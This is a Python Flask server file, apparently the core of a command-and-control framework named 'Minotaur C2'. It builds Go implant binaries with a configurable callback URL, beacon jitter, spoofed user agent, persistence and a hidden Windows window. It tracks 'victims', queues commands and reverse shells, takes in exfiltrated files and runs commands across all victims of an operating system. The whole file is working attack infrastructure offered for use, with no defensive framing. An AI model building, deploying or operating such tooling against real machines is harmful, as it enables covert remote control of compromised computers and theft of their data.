import os
import subprocess
import tempfile
import shutil
import sqlite3
import datetime
from datetime import timezone
import base64
import threading
import re

from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
from flask_socketio import SocketIO
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

# ---------- Shared managers and helpers ----------
from models.victim import VictimManager
from models.port_event import PortEventManager
from listeners.port_manager import PortManager
from handlers.command_handler import CommandHandler
from handlers.agent_handler import AgentManager
from handlers.activity_logger import ActivityLogger
from utils.logger import setup_logger

DB_PATH = os.path.join(os.path.dirname(__file__), '../database/c2.db')
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)

AGENT_STORAGE = os.path.join(os.path.dirname(__file__), '../web/static/agents')
os.makedirs(AGENT_STORAGE, exist_ok=True)

# Whitelist regex for OS/ARCH (alphanumeric, underscores, dashes)
VALID_GO_PARAM = re.compile(r'^[a-zA-Z0-9_\-]+$')

def sanitize_for_go_string(s: str) -> str:
    """Escape a string to be safely inserted inside a Go double-quoted string literal."""
    return s.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')

def init_db():
    """Enable WAL mode for better concurrency."""
    conn = sqlite3.connect(DB_PATH)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.close()

# Call early, before any requests
init_db()

# ---------- Create the two Flask apps ----------
agent_app = Flask(__name__)                     # for agent communication (public)
agent_app.config['SECRET_KEY'] = 'change-this-in-production'
dashboard_app = Flask(__name__, template_folder='../web/templates', static_folder='../web/static')
dashboard_app.config['SECRET_KEY'] = 'change-this-in-production'

# WebSocket only for the dashboard
socketio = SocketIO(dashboard_app, cors_allowed_origins="*", async_mode='threading')

# Instantiate managers (shared between both apps)
victim_mgr = VictimManager(socketio)
port_event_mgr = PortEventManager()
port_mgr = PortManager(victim_mgr, port_event_mgr, socketio)
cmd_handler = CommandHandler(victim_mgr)
agent_mgr = AgentManager(socketio)
activity_logger = ActivityLogger()
logger = setup_logger()

# ---------- Shared helper for agent version management ----------
def _get_db():
    """Get a new database connection (each call creates a new one for thread safety)."""
    return sqlite3.connect(DB_PATH)

def get_agent_versions_logic():
    conn = _get_db()
    c = conn.cursor()
    c.execute("SELECT version, platform, filename, compiled_at, size FROM agent_versions ORDER BY compiled_at DESC")
    rows = c.fetchall()
    c.execute("SELECT platform, version FROM agent_current_version")
    current = {row[0]: row[1] for row in c.fetchall()}
    conn.close()
    return [
        {
            'version': r[0],
            'platform': r[1],
            'filename': r[2],
            'compiled_at': r[3],
            'size': r[4] if r[4] is not None else 0,
            'is_current': current.get(r[1]) == r[0]
        }
        for r in rows
    ]

def set_current_version_logic(platform, version):
    conn = _get_db()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO agent_current_version (platform, version) VALUES (?,?)", (platform, version))
    conn.commit()
    conn.close()

def delete_agent_version_logic(version, platform):
    goos, goarch = platform.split('/')
    filename = f"minotaur_agent_{goos}_{goarch}_{version}"
    if goos == 'windows':
        filename += '.exe'
    version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
    full_path = os.path.join(version_dir, filename)
    if os.path.exists(full_path):
        os.remove(full_path)
    conn = _get_db()
    c = conn.cursor()
    c.execute("DELETE FROM agent_versions WHERE version=? AND platform=?", (version, platform))
    conn.commit()
    conn.close()

def list_agent_files_logic():
    conn = _get_db()
    c = conn.cursor()
    c.execute("SELECT platform, version FROM agent_current_version")
    current_versions = c.fetchall()
    conn.close()
    files = []
    for platform, version in current_versions:
        goos, goarch = platform.split('/')
        filename = f"minotaur_agent_{goos}_{goarch}_{version}"
        if goos == 'windows':
            filename += '.exe'
        version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
        full_path = os.path.join(version_dir, filename)
        if os.path.exists(full_path):
            rel_path = os.path.relpath(full_path, os.path.join(os.path.dirname(__file__), '../web/static')).replace('\\', '/')
            url = f'/static/{rel_path}'
            files.append({
                'filename': filename,
                'url': url,
                'platform': platform,
                'version': version,
                'size': os.path.getsize(full_path),
                'modified': datetime.datetime.fromtimestamp(os.path.getmtime(full_path), tz=timezone.utc).isoformat()
            })
    return files

# ---------- Shared helper for build endpoint ----------
def build_agent_impl(data):
    c2_url = data.get('c2_url', 'http://127.0.0.1:5000')
    beacon_delay = data.get('beacon_delay', 60)
    jitter = data.get('jitter', 5)
    user_agent = data.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    insecure_tls = data.get('insecure_tls', True)
    auto_persistence = data.get('auto_persistence', False)
    debug_mode = data.get('debug_mode', False)
    enable_auth = data.get('enable_auth', False)
    goos = data.get('goos', 'windows')
    goarch = data.get('goarch', 'amd64')

    # Validate goos/goarch against path traversal
    if not VALID_GO_PARAM.match(goos) or not VALID_GO_PARAM.match(goarch):
        return {'error': 'Invalid goos or goarch'}, 400

    version = datetime.datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')
    platform = f"{goos}/{goarch}"

    if not c2_url.startswith(('http://', 'https://')):
        return {'error': 'C2 URL must start with http:// or https://'}, 400
    if beacon_delay < 5:
        beacon_delay = 5
    if jitter < 0:
        jitter = 0

    # Escape strings for safe insertion into Go source
    c2_url_safe = sanitize_for_go_string(c2_url)
    user_agent_safe = sanitize_for_go_string(user_agent)

    # Read the main agent template
    common_path = os.path.join(os.path.dirname(__file__), '../agents/go/agent.go')
    unix_path = os.path.join(os.path.dirname(__file__), '../agents/go/agent_unix.go')
    win_path = os.path.join(os.path.dirname(__file__), '../agents/go/agent_windows.go')

    if not os.path.exists(common_path):
        return {'error': 'Agent template not found'}, 500

    with open(common_path, 'r') as f:
        agent_code = f.read()

    # Generate RSA keypair if authentication enabled
    public_key_pem = ""
    if enable_auth:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
        public_key = private_key.public_key()
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode('utf-8')
        public_key_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode('utf-8')
        agent_mgr.store_rsa_keypair(version, platform, private_key_pem, public_key_pem)
        # Escape backticks for Go raw string literals
        public_key_pem = public_key_pem.replace('`', '` + "`" + `')

    # Replace placeholders (using already escaped strings)
    agent_code = agent_code.replace('{{ .C2URL }}', c2_url_safe)
    agent_code = agent_code.replace('{{ .BeaconDelay }}', str(beacon_delay))
    agent_code = agent_code.replace('{{ .Jitter }}', str(jitter))
    agent_code = agent_code.replace('{{ .UserAgent }}', user_agent_safe)
    agent_code = agent_code.replace('{{ .InsecureTLS }}', str(insecure_tls).lower())
    agent_code = agent_code.replace('{{ .AutoPersistence }}', str(auto_persistence).lower())
    agent_code = agent_code.replace('{{ .DebugMode }}', str(debug_mode).lower())
    agent_code = agent_code.replace('{{ .AgentVersion }}', version)
    agent_code = agent_code.replace('{{ .EnableAuth }}', str(enable_auth).lower())
    agent_code = agent_code.replace('{{ .ServerPublicKey }}', public_key_pem)

    # Create temporary directory
    temp_dir = tempfile.mkdtemp()
    try:
        # Write main.go
        go_file = os.path.join(temp_dir, 'main.go')
        with open(go_file, 'w') as f:
            f.write(agent_code)

        # Copy platform‑specific files (if they exist)
        if os.path.exists(unix_path):
            with open(unix_path, 'r') as uf:
                unix_code = uf.read()
            with open(os.path.join(temp_dir, 'agent_unix.go'), 'w') as uf:
                uf.write(unix_code)

        if os.path.exists(win_path):
            with open(win_path, 'r') as wf:
                win_code = wf.read()
            with open(os.path.join(temp_dir, 'agent_windows.go'), 'w') as wf:
                wf.write(win_code)

        # Initialize Go module
        subprocess.run(['go', 'mod', 'init', 'minotaur-agent'], cwd=temp_dir, capture_output=True, text=True)
        subprocess.run(['go', 'mod', 'tidy'], cwd=temp_dir, capture_output=True, text=True)

        output_name = f'minotaur_agent_{goos}_{goarch}_{version}'
        if goos == 'windows':
            output_name += '.exe'

        if debug_mode:
            build_cmd = ['go', 'build', '-o', output_name]
        else:
            if goos == 'windows':
                build_cmd = ['go', 'build', '-ldflags=-s -w -H windowsgui', '-o', output_name]
            else:
                build_cmd = ['go', 'build', '-ldflags=-s -w', '-o', output_name]

        env = os.environ.copy()
        env['GOOS'] = goos
        env['GOARCH'] = goarch
        env['CGO_ENABLED'] = '0'

        result = subprocess.run(build_cmd, cwd=temp_dir, env=env, capture_output=True, text=True)

        if result.returncode != 0:
            return {'error': f'Build failed: {result.stderr}'}, 500

        binary_path = os.path.join(temp_dir, output_name)
        version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
        os.makedirs(version_dir, exist_ok=True)
        storage_path = os.path.join(version_dir, output_name)
        shutil.copy(binary_path, storage_path)

        # Record version in database
        conn = _get_db()
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS agent_versions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            version TEXT NOT NULL,
            platform TEXT NOT NULL,
            filename TEXT NOT NULL,
            compiled_at TEXT,
            size INTEGER
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS agent_current_version (
            platform TEXT PRIMARY KEY,
            version TEXT NOT NULL
        )''')
        now = datetime.datetime.now(timezone.utc).isoformat()
        c.execute("INSERT INTO agent_versions (version, platform, filename, compiled_at, size) VALUES (?,?,?,?,?)",
                  (version, platform, output_name, now, os.path.getsize(storage_path)))
        c.execute("SELECT version FROM agent_current_version WHERE platform=?", (platform,))
        if not c.fetchone():
            c.execute("INSERT INTO agent_current_version (platform, version) VALUES (?,?)", (platform, version))
        conn.commit()
        conn.close()

        return {'status': 'success', 'version': version, 'platform': platform, 'filename': output_name}, 200
    finally:
        shutil.rmtree(temp_dir)

# ---------- Agent API endpoints (port 5000) ----------
@agent_app.route('/api/agent/authenticate', methods=['POST'])
def agent_authenticate():
    data = request.json
    version = data.get('version')
    platform = data.get('platform')
    encrypted_challenge_b64 = data.get('challenge')
    if not version or not platform or not encrypted_challenge_b64:
        return jsonify({'error': 'Missing fields'}), 400
    priv_pem = agent_mgr.get_rsa_private_key(version, platform)
    if not priv_pem:
        return jsonify({'error': 'No key for this version'}), 404
    try:
        private_key = serialization.load_pem_private_key(priv_pem.encode(), password=None, backend=default_backend())
        encrypted = base64.b64decode(encrypted_challenge_b64)
        challenge = private_key.decrypt(encrypted, padding.PKCS1v15())
        return jsonify({'challenge': base64.b64encode(challenge).decode()})
    except Exception as e:
        return jsonify({'error': 'Authentication failed: ' + str(e)}), 400

@agent_app.route('/api/agent/register', methods=['POST'])
def agent_register():
    data = request.json
    hostname = data.get('hostname')
    os_type = data.get('os')
    ip = data.get('ip')
    arch = data.get('arch')
    version = data.get('version', 'unknown')
    platform = data.get('platform', 'unknown')
    if not hostname or not os_type:
        return jsonify({'error': 'Missing fields'}), 400
    agent_id = agent_mgr.register_agent(hostname, os_type, ip, arch, version, platform)
    return jsonify({'agent_id': agent_id})

@agent_app.route('/api/agent/beacon', methods=['POST'])
def agent_beacon():
    data = request.json
    agent_id = data.get('id')
    agent_version = data.get('version')
    agent_platform = data.get('platform')
    if not agent_id:
        return jsonify({'error': 'Agent ID required'}), 400
    agent_mgr.update_beacon(agent_id)
    commands = agent_mgr.get_pending_commands(agent_id, agent_version, agent_platform)
    return jsonify(commands)

@agent_app.route('/api/agent/result', methods=['POST'])
def agent_result():
    data = request.json
    cmd_id = data.get('command_id')
    agent_id = data.get('agent_id')
    output = data.get('output', '')
    error = data.get('error', '')
    if not agent_id:
        agent_id = agent_mgr.get_agent_id_for_command(cmd_id)
        if not agent_id:
            return jsonify({'error': 'Command not found'}), 404
    agent_mgr.save_result(cmd_id, agent_id, output, error)
    return jsonify({'status': 'ok'})

@agent_app.route('/api/agent/exfil', methods=['POST'])
def agent_exfil():
    data = request.json
    agent_id = data.get('agent_id')
    file_path = data.get('file_path')
    file_b64 = data.get('file_base64')
    if not all([agent_id, file_path, file_b64]):
        return jsonify({'error': 'Missing fields'}), 400
    agent_mgr.save_exfil(agent_id, file_path, file_b64)
    return jsonify({'status': 'ok'})

@agent_app.route('/api/agent/shell', methods=['POST'])
def agent_shell():
    data = request.json
    agent_id = data.get('agent_id')
    ip = data.get('ip')
    port = data.get('port')
    if not agent_id or not ip or not port:
        return jsonify({'error': 'Missing fields'}), 400
    agent_mgr.add_command(agent_id, 'shell-reverse', {'ip': ip, 'port': port})
    return jsonify({'status': 'sent'})

@agent_app.route('/api/build_agent', methods=['POST'])
def build_agent_api():
    resp, code = build_agent_impl(request.json)
    return jsonify(resp), code

# Shared version management endpoints on agent_app (called by agents if needed)
@agent_app.route('/api/agent/versions', methods=['GET'])
def get_agent_versions_api():
    return jsonify(get_agent_versions_logic())

@agent_app.route('/api/agent/set_current_version', methods=['POST'])
def set_current_version_api():
    data = request.json
    platform = data.get('platform')
    version = data.get('version')
    if not platform or not version:
        return jsonify({'error': 'Platform and version required'}), 400
    set_current_version_logic(platform, version)
    return jsonify({'status': 'success'})

@agent_app.route('/api/agent/delete_version', methods=['POST'])
def delete_agent_version_api():
    data = request.json
    version = data.get('version')
    platform = data.get('platform')
    if not version or not platform:
        return jsonify({'error': 'Version and platform required'}), 400
    delete_agent_version_logic(version, platform)
    return jsonify({'status': 'success'})

@agent_app.route('/api/agents/list')
def list_agent_files_api():
    return jsonify(list_agent_files_logic())

@agent_app.route('/static/agents/<path:filename>')
def serve_agent_binary(filename):
    return send_from_directory(AGENT_STORAGE, filename)

# ---------- Dashboard endpoints (port 5001, localhost) ----------
@dashboard_app.route('/')
def index():
    return render_template('dashboard.html')

@dashboard_app.route('/static/agents/<path:filename>')
def serve_agent_binary_dashboard(filename):
    return send_from_directory(AGENT_STORAGE, filename)

@dashboard_app.route('/api/victims')
def get_victims():
    return jsonify(victim_mgr.get_all_victims())

@dashboard_app.route('/api/agents')
def list_agents_dashboard():
    return jsonify(agent_mgr.list_agents())

@dashboard_app.route('/api/execute', methods=['POST'])
def execute_command():
    data = request.json
    target = data.get('target')
    command = data.get('command')
    if target == 'single':
        victim_id = data.get('victim_id')
        if not victim_id:
            return jsonify({'error': 'victim_id required'}), 400
        result = cmd_handler.execute_on_victim(victim_id, command)
        return jsonify(result)
    elif target == 'os':
        os_type = data.get('os_type')
        if not os_type:
            return jsonify({'error': 'os_type required'}), 400
        results = cmd_handler.execute_on_os(os_type, command)
        return jsonify(results)
    else:
        return jsonify({'error': 'Invalid target type'}), 400

@dashboard_app.route('/api/set_os', methods=['POST'])
def set_victim_os():
    data = request.json
    victim_id = data.get('victim_id')
    os_type = data.get('os_type')
    if not victim_id or not os_type:
        return jsonify({'error': 'victim_id and os_type required'}), 400
    if victim_mgr.update_victim_os(victim_id, os_type):
        return jsonify({'status': 'updated'})
    return jsonify({'error': 'Victim not found'}), 404

@dashboard_app.route('/api/agent/send_command', methods=['POST'])
def send_agent_command():
    data = request.json
    agent_id = data.get('agent_id')
    cmd_type = data.get('type')
    payload = data.get('payload')
    if not agent_id or not cmd_type:
        return jsonify({'error': 'Missing fields'}), 400
    cmd_id = agent_mgr.add_command(agent_id, cmd_type, payload)
    return jsonify({'command_id': cmd_id})

@dashboard_app.route('/api/agent/delete', methods=['POST'])
def agent_delete():
    data = request.json
    agent_id = data.get('agent_id')
    if not agent_id:
        return jsonify({'error': 'Agent ID required'}), 400
    agent_mgr.add_command(agent_id, 'delete', {})
    agent_mgr.delete_agent(agent_id)
    return jsonify({'status': 'deleted'})

@dashboard_app.route('/api/agents/clear_all', methods=['POST'])
def clear_all_agents():
    agent_mgr.clear_all_agents()
    return jsonify({'status': 'cleared'})

@dashboard_app.route('/api/build_agent', methods=['POST'])
def build_agent_dashboard():
    resp, code = build_agent_impl(request.json)
    return jsonify(resp), code

# Dashboard version management (reuse same logic)
@dashboard_app.route('/api/agent/versions', methods=['GET'])
def get_agent_versions_dashboard():
    return jsonify(get_agent_versions_logic())

@dashboard_app.route('/api/agent/set_current_version', methods=['POST'])
def set_current_version_dashboard():
    data = request.json
    platform = data.get('platform')
    version = data.get('version')
    if not platform or not version:
        return jsonify({'error': 'Platform and version required'}), 400
    set_current_version_logic(platform, version)
    return jsonify({'status': 'success'})

@dashboard_app.route('/api/agent/delete_version', methods=['POST'])
def delete_agent_version_dashboard():
    data = request.json
    version = data.get('version')
    platform = data.get('platform')
    if not version or not platform:
        return jsonify({'error': 'Version and platform required'}), 400
    delete_agent_version_logic(version, platform)
    return jsonify({'status': 'success'})

@dashboard_app.route('/api/agents/list')
def list_agent_files_dashboard():
    return jsonify(list_agent_files_logic())

# Port management endpoints
@dashboard_app.route('/api/open_port', methods=['POST'])
def open_port():
    data = request.json
    port = data.get('port')
    if not port:
        return jsonify({'error': 'Port number required'}), 400
    try:
        port = int(port)
        port_mgr.start_listener(port)
        return jsonify({'status': 'listening', 'port': port})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@dashboard_app.route('/api/stop_port', methods=['POST'])
def stop_port():
    data = request.json
    port = data.get('port')
    if not port:
        return jsonify({'error': 'Port required'}), 400
    if port_mgr.stop_listener(int(port)):
        return jsonify({'status': 'stopped', 'port': port})
    return jsonify({'error': 'Port not listening'}), 404

@dashboard_app.route('/api/port_events')
def get_port_events():
    limit = request.args.get('limit', 50, type=int)
    events = port_event_mgr.get_recent_events(limit)
    return jsonify(events)

@dashboard_app.route('/api/active_ports')
def get_active_ports():
    ports = port_mgr.get_active_ports()
    return jsonify(ports)

@dashboard_app.route('/api/open_ports', methods=['POST'])
def open_ports():
    data = request.json
    port_range = data.get('range')
    if not port_range:
        return jsonify({'error': 'Port range required'}), 400
    try:
        if '-' in port_range:
            start, end = map(int, port_range.split('-'))
            if start > end:
                return jsonify({'error': 'Invalid range: start > end'}), 400
            if end - start + 1 > 100:
                return jsonify({'error': 'Range too large (max 100 ports)'}), 400
            ports = list(range(start, end+1))
        else:
            ports = [int(port_range)]
    except ValueError:
        return jsonify({'error': 'Invalid port or range format'}), 400
    results = []
    for port in ports:
        try:
            port_mgr.start_listener(port)
            results.append({'port': port, 'status': 'listening'})
        except Exception as e:
            results.append({'port': port, 'error': str(e)})
    return jsonify(results)

# Activity logs endpoints
@dashboard_app.route('/api/activity/shell')
def get_shell_activity():
    victim_id = request.args.get('victim_id')
    limit = request.args.get('limit', 100, type=int)
    logs = activity_logger.get_shell_logs(victim_id, limit)
    return jsonify(logs)

@dashboard_app.route('/api/activity/agent')
def get_agent_activity():
    agent_id = request.args.get('agent_id')
    limit = request.args.get('limit', 100, type=int)
    logs = activity_logger.get_agent_logs(agent_id, limit)
    return jsonify(logs)

@dashboard_app.route('/api/logs/victims')
def get_log_victims():
    victims = activity_logger.get_distinct_victim_ids()
    return jsonify(victims)

@dashboard_app.route('/api/logs/agents')
def get_log_agents():
    agents = activity_logger.get_distinct_agent_ids()
    return jsonify(agents)

@dashboard_app.route('/api/export/logs', methods=['GET'])
def export_logs():
    from io import BytesIO
    log_type = request.args.get('type')
    filter_id = request.args.get('id')
    if log_type not in ['shell', 'agent']:
        return jsonify({'error': 'Invalid log type'}), 400
    if log_type == 'shell':
        logs = activity_logger.get_shell_logs(filter_id, limit=10000)
        lines = [f"Minotaur C2 - Shell Activity Logs (filter: {filter_id or 'all'})", "=" * 60]
        for log in logs:
            t = log['timestamp']
            victim = log['victim_id'][:8] if log['victim_id'] else '?'
            if log['direction'] == 'sent':
                lines.append(f"[{t}] → [Victim {victim}] COMMAND: {log['command']}")
            else:
                lines.append(f"[{t}] ← [Victim {victim}] OUTPUT: {log['output']}")
        content = "\n".join(lines)
        filename = f"minotaur_shell_logs_{datetime.datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
    else:
        logs = activity_logger.get_agent_logs(filter_id, limit=10000)
        lines = [f"Minotaur C2 - Agent Activity Logs (filter: {filter_id or 'all'})", "=" * 60]
        for log in logs:
            sent = log['sent_at']
            agent = log['agent_id'][:8]
            completed = log['completed_at'] or 'pending'
            lines.append(f"[{sent}] Agent {agent} | Type: {log['type']}")
            lines.append(f"  Payload: {log['payload']}")
            lines.append(f"  Result: {log['output'] or log['error'] or '(no result)'}")
            lines.append(f"  Completed: {completed}")
            lines.append("-" * 40)
        content = "\n".join(lines)
        filename = f"minotaur_agent_logs_{datetime.datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
    data = BytesIO(content.encode('utf-8'))
    return send_file(data, as_attachment=True, download_name=filename, mimetype='text/plain')

# WebSocket events for dashboard
@socketio.on('connect')
def handle_connect():
    logger.info(f"Dashboard client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Dashboard client disconnected: {request.sid}")

# ---------- Run both servers on separate threads ----------
def run_agent_api():
    agent_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

def run_dashboard():
    socketio.run(dashboard_app, host='127.0.0.1', port=5001, debug=False, use_reloader=False)

if __name__ == '__main__':
    agent_thread = threading.Thread(target=run_agent_api, daemon=True)
    agent_thread.start()
    run_dashboard()